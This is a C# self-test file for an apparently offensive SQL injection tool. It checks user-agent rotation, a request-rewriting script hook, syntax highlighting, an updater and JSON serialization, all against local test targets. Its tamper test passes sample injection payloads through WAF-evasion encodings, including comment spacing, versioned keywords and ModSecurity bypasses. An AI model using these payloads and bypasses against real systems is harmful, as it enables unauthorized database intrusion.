    //2. JSON往返：序列化→反序列化保持类型与UA
    var bp = new SuperSQLInjectionV2.Models.ByPassConfig();
    bp.UaItemList.Add(new SuperSQLInjectionV2.Models.UaItem("Windows", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0.0.0"));
    bp.UaItemList.Add(new SuperSQLInjectionV2.Models.UaItem("iPhone", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) Mobile/15E148"));
    string json = System.Text.Json.JsonSerializer.Serialize(bp);
    var bp2 = System.Text.Json.JsonSerializer.Deserialize<SuperSQLInjectionV2.Models.ByPassConfig>(json);
    bool rt = bp2 != null && bp2.UaItemList.Count == 2 && bp2.UaItemList[0].Type == "Windows" && bp2.UaItemList[1].Ua.Contains("iPhone");
    Console.WriteLine($"[JSON] 往返后新池{bp2?.UaItemList.Count}条 类型与UA完整={rt}：{(rt ? "PASS" : "FAIL")}");
    if (rt) pass++; else fail++;

    Console.WriteLine($"===== UA池结果: PASS={pass} FAIL={fail} =====");
}

// ===== --eval报文级钩子自检：钩子改写UA头后对/echo-ua发包，断言目标收到改写值；另验证关闭不生效与异常容错 =====
static async Task EvalHookTest()
{
    Console.WriteLine("===== --eval 报文级钩子自检 =====");
    int pass = 0, fail = 0;
    var config = new AppConfig();
    Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
    config.Host = "127.0.0.1";
    config.Port = twaPort;
    config.IsSSL = false;
    config.TimeOut = 15;

    string reqTxt = $"GET /echo-ua HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nUser-Agent: EvalBase\r\nConnection: close\r\n\r\n";
    async Task<string> SendUa()
    {
        var req = new HttpRequest(config, reqTxt);
        var resp = await HTTPTool.SendRequestRetryAsync(req);
        return (resp.BodyTxt ?? "").Trim();
    }

    //1. 未启用钩子：UA原样到达
    string plain = await SendUa();
    bool ok1 = plain == "EvalBase";
    Console.WriteLine($"[关闭不生效] UA回显={plain}：{(ok1 ? "PASS" : "FAIL")}");
    if (ok1) pass++; else fail++;

    //2. 启用报文级编码工具（统一链路：旧eval钩子→Request级EncodeTool）：正则改写UA头，目标应收到改写值
    var hookItem = new EncodeToolModel
    {
        Name = "eval-hook",
        Scope = ScriptScope.Request,
        Code = "function tamper(request){ return request.replace(/^User-Agent:[^\\r\\n]*/im, 'User-Agent: EvalHooked/9.9'); }",
        Enable = true
    };
    config.ByPassConfig.EncodeTools.Add(hookItem);
    string hooked = await SendUa();
    bool ok2 = hooked == "EvalHooked/9.9";
    Console.WriteLine($"[启用改写] UA回显={hooked}：{(ok2 ? "PASS" : "FAIL")}");
    if (ok2) pass++; else fail++;

    //3. 异常脚本容错：不阻断发包，报文按原样发送
    hookItem.Code = "function tamper(request){ throw new Error('boom'); }";
    string boom = await SendUa();
    bool ok3 = boom == "EvalBase";
    Console.WriteLine($"[异常容错] UA回显={boom}：{(ok3 ? "PASS" : "FAIL")}");
    if (ok3) pass++; else fail++;

    config.ByPassConfig.EncodeTools.Remove(hookItem);
    Console.WriteLine($"===== eval结果: PASS={pass} FAIL={fail} =====");
    if (fail > 0) Environment.ExitCode = 1;
}

// ===== 统一编码工具注册表冒烟（tamper/编码处理合并）：逐个执行EncodeToolRegistry可见项并断言变换语义 =====
static void TamperLibTest()
{
    int pass = 0, fail = 0;
    string sample = "1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE version() > 5) = 'abc'";
    var asserts = new Dictionary<string, Func<string, bool>>
    {
        ["space2comment"] = o => !o.Contains(" AND ") && o.Contains("/**/"),
        //合并后换行版：空格→--随机串+真换行（随后由兜底URL编码为%0A）
        ["space2dash"] = o => o.Contains("--") && o.Contains("\n") && !o.Contains(" AND "),
        ["space2hash"] = o => o.Contains("#") && o.Contains("\n") && !o.Contains(" AND "),
        ["space2randomblank"] = o => !o.Contains(" AND "),
        ["multiplespaces"] = o => o.Contains("  ") && o.ToUpper().Contains("AND"),
        ["randomcase"] = o => string.Equals(o, sample, StringComparison.OrdinalIgnoreCase) && o != sample && o.Contains("'abc'"),
        ["randomcomments"] = o => o.Contains("/**/") && System.Text.RegularExpressions.Regex.IsMatch(o.ToUpper().Replace("/**/", ""), "SELECT"),
        ["charencode"] = o => o.StartsWith("%31") && o.Contains("%20") && !o.Contains(" AND "),
        ["chardoubleencode"] = o => o.StartsWith("%2531") && o.Contains("%25"),
        ["percentage"] = o => o.Contains("%A%N%D") || o.Contains("%1"),
        ["apostrophemask"] = o => !o.Contains("'") && o.Contains("%EF%BC%87"),
        ["equaltolike"] = o => o.Contains(" LIKE ") && !System.Text.RegularExpressions.Regex.IsMatch(o, @"\s=\s"),
        ["between"] = o => o.Contains("NOT BETWEEN 0 AND") && !o.Contains("> 5"),
        ["ifnull2ifisnull"] = null, // 专用payload单独测
        ["versionedmorekeywords"] = o => o.Contains("/*!50000") && o.Contains("*/") && System.Text.RegularExpressions.Regex.IsMatch(o, @"/\*!50000SELECT\*/", System.Text.RegularExpressions.RegexOptions.IgnoreCase),
        ["halfversionedmorekeywords"] = o => System.Text.RegularExpressions.Regex.IsMatch(o, @"/\*!0SELECT", System.Text.RegularExpressions.RegexOptions.IgnoreCase),
        ["modsecurityversioned"] = o => o.StartsWith("/*!30000 ") && o.EndsWith("*/"),
        ["base64encode"] = o => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(o)) == sample,
        ["greatest"] = o => o.Contains("GREATEST(") && !o.Contains("> 5"),
        ["space2plus"] = o => o.Contains("+AND+") && !o.Contains(" AND "),
        ["space2mssqlblank"] = o => !o.Contains(" AND ") && o.Contains("%"),
        ["apostrophenullencode"] = o => !o.Contains("'") && o.Contains("%00%27"),
        ["charunicodeencode"] = o => o.Contains("%u0020") && !o.Contains(" AND "),
        ["htmlencode"] = o => o.Contains("&#x20;") && !o.Contains(" AND "),
        ["commalessmid"] = o => o == "MID(VERSION() FROM 1 FOR 1)",
        ["concat2concatws"] = o => o.StartsWith("CONCAT_WS(MID(CHAR(0),0,0),"),
        ["symboliclogical"] = o => o.Contains("&&") && !o.Contains(" AND "),
        ["escapequotes"] = o => o.Contains("\\'") && !o.Replace("\\'", "").Contains("'"),
        ["uppercase"] = o => o == "1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE VERSION() > 5) = 'abc'",
        ["unionalltounion"] = o => o == "1 UNION SELECT 1,2",
        ["ifnull2casewhenisnull"] = o => o == "CASE WHEN ISNULL(version()) THEN 'x' ELSE version() END",
        //---- 合并自原EncodeType的独有能力 ----
        ["urlencode"] = o => !o.Contains(" AND ") && o.Contains("%20"),
        ["hex"] = o => o.StartsWith("0x") && o.Length > 2 && o.Substring(2).All(c => "0123456789abcdefABCDEF".Contains(c)),
        ["lowercase"] = o => !o.Contains(" AND ") && o.Contains(" and ") && o.Contains("'abc'"),
        ["altcase"] = o => o != sample && string.Equals(o, sample, StringComparison.OrdinalIgnoreCase) && o.Contains("'abc'"),
        ["unicode"] = o => o.StartsWith("%u0031") && o.Contains("%u0041"),
        ["includecomment"] = o => o.Contains("/*!") && o.Contains("*/"),
    };
    //统一注册表：遍历可见项（隐藏遗留变体不在添加列表，单独由迁移路径覆盖）
    foreach (var bt in SuperSQLInjectionV2.Bypass.EncodeToolRegistry.VisibleTools.OrderBy(x => x.Key))
    {
        var item = new EncodeToolModel { Name = bt.Name, Key = bt.Key, Builtin = true, Enable = true };
        try
        {
            string input = bt.Key switch
            {
                "ifnull2ifisnull" or "ifnull2casewhenisnull" => "IFNULL(version(), 'x')",
                "commalessmid" => "MID(VERSION(),1,1)",
                "concat2concatws" => "CONCAT(0x1,0x2)",
                "unionalltounion" => "1 UNION ALL SELECT 1,2",
                _ => sample,
            };
            string output = SuperSQLInjectionV2.Bypass.ScriptTamperEngine.TamperStrict(item, input);
            var assert = asserts.TryGetValue(bt.Key, out var fn) ? fn : null;
            bool ok = assert == null ? output != input : assert(output);
            Console.WriteLine($"[{bt.Key}(内置)] => {(output.Length > 70 ? output.Substring(0, 70).Replace("\n", "\\n") + "..." : output.Replace("\n", "\\n"))}  :{(ok ? "PASS" : "FAIL")}");
            if (ok) pass++; else fail++;
        }
        catch (Exception e)
        {
            Console.WriteLine($"[{bt.Key}(内置)] 执行异常：{e.Message.Split('\n')[0]}  :FAIL");
            fail++;
        }
    }
    //遗留变体（隐藏项）：旧配置迁移目标，行为需保持旧版语义
    foreach (var legacy in new[] { "charunicodeencodeall", "halfversionedmorekeywords-full" })
    {
        if (!SuperSQLInjectionV2.Bypass.EncodeToolRegistry.TryGet(legacy, out var lt))
        {
            Console.WriteLine($"[{legacy}(遗留)] 注册表缺失  :FAIL");
            fail++;
            continue;
        }
        string output = lt.Impl(sample);
        bool ok = legacy == "charunicodeencodeall"
            ? output.StartsWith("%u0031") && output.Contains("%u0041")
            : output.Contains("/*!0SELECT*/");
        Console.WriteLine($"[{legacy}(遗留)] => {(output.Length > 70 ? output.Substring(0, 70) + "..." : output)}  :{(ok ? "PASS" : "FAIL")}");
        if (ok) pass++; else fail++;
    }
    Console.WriteLine($"===== tamper库结果: PASS={pass} FAIL={fail} =====");
}

// ===== Http.xshd 高亮定义冒烟：XML结构 + 全部正则可用性 + 关键标记样例匹配 =====
static void XshdTest()
{
    int pass = 0, fail = 0;
    string assetDir = Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "SuperSQLInjectionV2", "Assets"));
    // 关键规则必须命中的样例（按文件分组，请求区/响应区特征不同）
    var sampleGroups = new Dictionary<string, (string sample, string desc)[]>
    {
        ["Http.xshd"] = new[] {
            ("<Encode>1$sql$</Encode>", "Encode块"),
            ("$sql$", "注入标记"),
            ("<Rand>", "Rand标记"),
            ("GET /JVApp/mysql.jsp?id=1 HTTP/1.1", "请求行"),
            ("User-Agent: Mozilla/5.0", "请求头"),
            ("HTTP/1.1 200 OK", "状态码"),
            ("id=1%20AND%20'1'='1'", "百分号编码"),
        },
        ["HttpDark.xshd"] = new[] {
            ("<Encode>1$sql$</Encode>", "Encode块"),
            ("$sql$", "注入标记"),
            ("<Rand>", "Rand标记"),
            ("GET /JVApp/mysql.jsp?id=1 HTTP/1.1", "请求行"),
            ("User-Agent: Mozilla/5.0", "请求头"),
            ("HTTP/1.1 200 OK", "状态码"),
            ("id=1%20AND%20'1'='1'", "百分号编码"),
        },
        ["HttpData.xshd"] = new[] {
            ("$sql$", "注入标记"),
            ("HTTP/1.1 200 OK", "响应行"),
            ("Content-Type: text/html; charset=utf-8", "响应头"),
            ("<div class=\"user\">", "HTML标签"),
            ("<!-- comment -->", "HTML注释"),
            ("You have an error in your SQL syntax near", "SQL报错指纹"),
            ("ORA-00933: SQL command not properly ended", "Oracle报错"),
            ("0x4F8A2C1B", "hex段"),
            ("{\"name\":\"admin\",\"id\":1}", "JSON键名"),
            ("http://127.0.0.1:8090/api", "URL"),
            ("id=1%20AND%20'1'='1'", "百分号编码"),
        },
        ["HttpDataDark.xshd"] = new[] {
            ("$sql$", "注入标记"),
            ("HTTP/1.1 200 OK", "响应行"),
            ("Content-Type: text/html; charset=utf-8", "响应头"),
            ("<div class=\"user\">", "HTML标签"),
            ("<!-- comment -->", "HTML注释"),
            ("You have an error in your SQL syntax near", "SQL报错指纹"),
            ("ORA-00933: SQL command not properly ended", "Oracle报错"),
            ("0x4F8A2C1B", "hex段"),
            ("{\"name\":\"admin\",\"id\":1}", "JSON键名"),
            ("http://127.0.0.1:8090/api", "URL"),
            ("id=1%20AND%20'1'='1'", "百分号编码"),
        },
    };
    foreach (string name in new[] { "Http.xshd", "HttpDark.xshd", "HttpData.xshd", "HttpDataDark.xshd" })
    {
        string path = Path.Combine(assetDir, name);
        try
        {
            var doc = System.Xml.Linq.XDocument.Load(path);
            var root = doc.Root!;
            var ruleset = root.Element("{http://icsharpcode.net/sharpdevelop/syntaxdefinition/2008}RuleSet")!;
            //收集全部正则（Rule文本 + Span Begin/End）——不Trim，完全模拟 HighlightingLoader 的原始读取行为
            var regexes = new List<string>();
            foreach (var r in ruleset.Elements().Where(e => e.Name.LocalName == "Rule"))
                regexes.Add(r.Value);
            foreach (var sp in ruleset.Elements().Where(e => e.Name.LocalName == "Span"))
            {
                regexes.Add(sp.Element(sp.Name.Namespace + "Begin")!.Value);
                regexes.Add(sp.Element(sp.Name.Namespace + "End")!.Value);
            }
            //格式断言：正则含换行/首尾空白/字面空格（IgnorePatternWhitespace会剥离空格导致规则失效）都会让真实加载器行为偏离，必须单行且用\x20代替空格
            int badFormat = regexes.Count(rx => rx != rx.Trim ()|| rx.Contains('\n') || rx.Contains('\r') || rx.Contains(' '));
            Console.WriteLine($"[{name}] 单行格式检查（{regexes.Count}条正则，{badFormat}条违规）：{(badFormat == 0 ? "PASS" : "FAIL")}");
            if (badFormat == 0) pass++; else fail++;
            //逐个编译正则
            var compiled = regexes.Select(rx => new System.Text.RegularExpressions.Regex(rx)).ToList();
            bool allCompile = compiled.Count == regexes.Count;
            Console.WriteLine($"[{name}] XML+{regexes.Count}条正则编译：{(allCompile ? "PASS" : "FAIL")}");
            if (allCompile) pass++; else fail++;
            //样例命中：每条例样至少被一条规则命中
            foreach (var (sample, desc) in sampleGroups[name])
            {
                bool hit = compiled.Any(rx => rx.IsMatch(sample));
                Console.WriteLine($"  [{name}][{desc}] 命中={hit}：{(hit ? "PASS" : "FAIL")}");
                if (hit) pass++; else fail++;
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"[{name}] 失败：{e.Message.Split((char)10)[0]}：FAIL");
            fail++;
        }
    }
    Console.WriteLine($"===== xshd结果: PASS={pass} FAIL={fail} =====");
}

/// <summary>
/// 更新客户端链路验证（upd [server] [appId] [key]）：检查更新 → 有更新则下载到 update-test 暂存目录并校验落地文件。
/// 需先启动 SoftUpdate.Server 并发布一个高于 2.0.0 的测试版本。
/// </summary>
static async Task UpdateFlowTest(string server, string appId, string key)
{
    Console.WriteLine($"===== 更新客户端链路验证 server={server} app={appId} =====");
    int pass = 0, fail = 0;
    string staging = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "update-test");
    try
    {
        if (Directory.Exists(staging))
        {
            Directory.Delete(staging, true);
        }
        using var mgr = new SuperSQLInjectionV2.Tools.Update.UpdateManager(new SuperSQLInjectionV2.Tools.Update.UpdateManagerOptions
        {
            ServerUrl = server,
            AppId = appId,
            ClientAuthKey = key,
            Channel = "stable",
            InstallDir = staging
        });
        //当前版本字面量（与主程序 ConstData.AppVersion 保持一致；ConstData为internal不可跨程序集访问）
        var check = await mgr.CheckForUpdatesAsync("2.0.0");
        Console.WriteLine($"[检查更新] hasUpdate={check.HasUpdate} version={check.Manifest?.Version ?? "-"} mandatory={check.Mandatory} msg={check.Message ?? "-"}");
        if (check.HasUpdate && check.Manifest != null)
        {
            pass++;
            var manifest = check.Manifest;
            Console.WriteLine($"[清单] files={manifest.Files.Count} notes={(manifest.Notes ?? "").Replace("\n", " ")}");
            string pkg = await mgr.DownloadUpdateAsync(manifest, new Progress<SuperSQLInjectionV2.Tools.Update.UpdateProgress>(p =>
                Console.WriteLine($"[下载] {p.Percent:F0}% {p.TransferredBytes / 1024}KB/{p.TotalBytes / 1024}KB {p.CurrentFile}")));
            bool ok = File.Exists(pkg) && new FileInfo(pkg).Length == manifest.Files[0].Size;
            Console.WriteLine($"[落地校验] {Path.GetFileName(pkg)} size={manifest.Files[0].Size} {(ok ? "PASS" : "FAIL")}");
            Console.WriteLine(ok ? "[upd] 下载落地 PASS" : "[upd] 落地失败 FAIL");
            if (ok) pass++; else fail++;
        }
        else
        {
            Console.WriteLine("[upd] 无更新（服务端无更高版本时属正常）");
        }
    }
    catch (Exception e)
    {
        Console.WriteLine($"[upd] 异常：{e.Message} FAIL");
        fail++;
    }
    Console.WriteLine($"===== upd结果: PASS={pass} FAIL={fail} =====");
}

void JsonSmoke()
{
    int pass = 0, fail = 0;
    void Check(string name, Func<bool> f)
    {
        try
        {
            bool ok = f();
            Console.WriteLine((ok ? "PASS " : "FAIL ") + name);
            if (ok) pass++; else fail++;
        }
        catch (Exception ex)
        {
            fail++;
            Console.WriteLine("FAIL " + name + " 异常: " + ex.GetType().Name + " " + ex.Message.Split((char)10)[0]);
        }
    }

    Check("AppConfig roundtrip", () =>
    {
        var cfg = new AppConfig();
        string json = System.Text.Json.JsonSerializer.Serialize(cfg, SuperSQLInjectionV2.Source.JsonCtx.Indented);
        var back = System.Text.Json.JsonSerializer.Deserialize<AppConfig>(json, SuperSQLInjectionV2.Source.JsonCtx.Indented);
        return back != null && back.DataConfig != null && back.ByPassConfig != null;
    });

    Check("InjectRecord list roundtrip", () =>
    {
        var list = new List<InjectRecord> { new InjectRecord { PName = "id", DBType = DBType.MySQL, InjectType = InjectType.Union, Target = "127.0.0.1:8090", Where = 2, VectorTemplate = "abc[QUERY]" } };
        string json = System.Text.Json.JsonSerializer.Serialize(list, SuperSQLInjectionV2.Source.JsonCtx.Compact);
        var back = System.Text.Json.JsonSerializer.Deserialize<List<InjectRecord>>(json, SuperSQLInjectionV2.Source.JsonCtx.Compact);
        return back != null && back.Count == 1 && back[0].DBType == DBType.MySQL && back[0].Where == 2 && back[0].VectorTemplate == "abc[QUERY]";
    });

    Check("Dictionary<string,string> roundtrip", () =>
    {
        var dic = new Dictionary<string, string> { ["k1"] = "中文值", ["k2"] = "v2" };
        string json = System.Text.Json.JsonSerializer.Serialize(dic, SuperSQLInjectionV2.Source.JsonCtx.Compact);
        var back = System.Text.Json.JsonSerializer.Deserialize<Dictionary<string, string>>(json, SuperSQLInjectionV2.Source.JsonCtx.Compact);
        return back != null && back["k1"] == "中文值" && back.Count == 2;
    });

    Check("DBStructNodeDto tree roundtrip", () =>
    {
        var dtos = new List<DataDumpViewModel.DBStructNodeDto>
        {
            new DataDumpViewModel.DBStructNodeDto { Type = "DBName", Value = "testdb", SubItems = { new DataDumpViewModel.DBStructNodeDto { Type = "Table", Value = "users" } } }
        };
        string json = System.Text.Json.JsonSerializer.Serialize(dtos, SuperSQLInjectionV2.Source.JsonCtx.Indented);
        var back = System.Text.Json.JsonSerializer.Deserialize<List<DataDumpViewModel.DBStructNodeDto>>(json, SuperSQLInjectionV2.Source.JsonCtx.Indented);
        return back != null && back.Count == 1 && back[0].SubItems.Count == 1 && back[0].SubItems[0].Value == "users";
    });

    Check("NgramDeltaDto roundtrip", () =>
    {
        var dto = new NgramDeltaDto { Tri = { ["ab"] = new Dictionary<string, int> { ["c"] = 5 } }, Bi = { ["x"] = new Dictionary<string, int> { ["y"] = 2 } } };
        string json = System.Text.Json.JsonSerializer.Serialize(dto, SuperSQLInjectionV2.Source.JsonCtx.Compact);
        return json.Contains("\"tri\"") && json.Contains("\"ab\"");
    });

    Check("CheckUpdateResponse web parse", () =>
    {
        string body = "{\"hasUpdate\":true,\"mandatory\":false,\"manifest\":{\"appId\":\"supersqlinjection\",\"version\":\"2.1.0\",\"channel\":\"stable\",\"publishedAtUtc\":\"2026-09-20T00:00:00Z\",\"files\":[{\"path\":\"SuperSQLInjectionV2.Desktop.exe\",\"size\":91781120,\"sha256\":\"ab\"}]}}";
        var back = System.Text.Json.JsonSerializer.Deserialize<SuperSQLInjectionV2.Tools.Update.CheckUpdateResponse>(body, SuperSQLInjectionV2.Source.JsonCtx.Web);
        return back != null && back.HasUpdate && back.Manifest != null && back.Manifest.Version == "2.1.0" && back.Manifest.Files.Count == 1;
    });

    Check("Enum.GetValues<T> generic", () => Enum.GetValues<DBType>().Length > 5 && Enum.GetValues<ScriptLang>().Length >= 1);

    Console.WriteLine($"===== jsonsmoke结果: PASS={pass} FAIL={fail} =====");
}

// TestWebApp 靶场端口：环境变量 TESTWEBAPP_PORT 可覆盖（默认5099；5099被Windows保留段占用时用 5199 等空闲端口）
partial class Program
{
    static readonly int twaPort = int.TryParse(Environment.GetEnvironmentVariable("TESTWEBAPP_PORT"), out var tp) ? tp : 5099;
}
